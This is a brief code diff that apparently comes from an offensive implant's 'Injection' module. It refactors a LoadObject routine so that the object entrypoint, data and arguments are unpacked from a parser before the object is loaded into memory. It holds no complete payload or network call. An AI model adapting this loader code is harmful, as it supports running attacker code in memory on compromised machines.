@@ -51,10 +51,21 @@ namespace Injection {
         }
     }
 
-    VOID LoadObject(const char* const entrypoint, uint8_t* const data, uint8_t* const args, size_t arg_size, uint32_t req_id) {
+    VOID LoadObject(_parser *parser) {
         HEXANE
 
-        _executable object = { };
+        _executable object  = { };
+        char *entrypoint    = { };
+        uint8_t *data       = { };
+        uint8_t *args       = { };
+
+        uint32_t arg_size   = 0;
+        uint32_t req_id     = 0;
+
+        entrypoint  = Parser::UnpackString(parser, nullptr);
+        data        = Parser::UnpackBytes(parser, nullptr);
+        args        = Parser::UnpackBytes(parser, &arg_size);
+
         Memory::Methods::CreateImageData(B_PTR(data));
 
         object.next = Ctx->coffs;
